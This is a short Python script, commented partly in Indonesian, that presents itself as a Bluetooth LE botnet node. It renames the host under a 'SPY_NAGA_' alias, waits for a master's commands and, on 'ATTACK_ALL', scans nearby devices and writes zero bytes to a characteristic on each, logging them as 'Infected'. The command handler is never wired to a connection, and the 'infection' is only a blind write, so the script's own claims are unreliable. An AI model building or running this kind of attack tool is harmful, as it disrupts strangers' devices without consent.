#!/usr/bin/env python3
import os, time, random, subprocess
from bluepy.btle import Peripheral, DefaultDelegate, Scanner, ADDR_TYPE_RANDOM

PREFIX = "SPY_NAGA_"

class MeshHandler(DefaultDelegate):
    def handleNotification(self, cHandle, data):
        cmd = data.decode('utf-8', errors='ignore')
        print(f"[*] RECV COMMAND: {cmd}")
        if cmd == "ATTACK_ALL":
            self.auto_jam()

    def auto_jam(self):
        scanner = Scanner()
        devs = scanner.scan(5.0)
        for d in devs:
            try:
                p = Peripheral(d.addr, ADDR_TYPE_RANDOM)
                p.writeCharacteristic(0x0001, b"\x00"*20)
                p.disconnect()
                print(f"[!] Infected: {d.addr}")
            except: pass

def start_beacon():
    name = f"{PREFIX}{random.randint(100,999)}"
    print(f"[*] Menjadi Node Botnet: {name}")
    os.system("bluetoothctl power on")
    os.system(f"bluetoothctl system-alias {name}")
    os.system("bluetoothctl discoverable on")
    
    # Logic untuk standby menerima perintah dari Master
    print("[*] Standby for Master Commands...")
    while True:
        time.sleep(10)

if __name__ == "__main__":
    start_beacon()
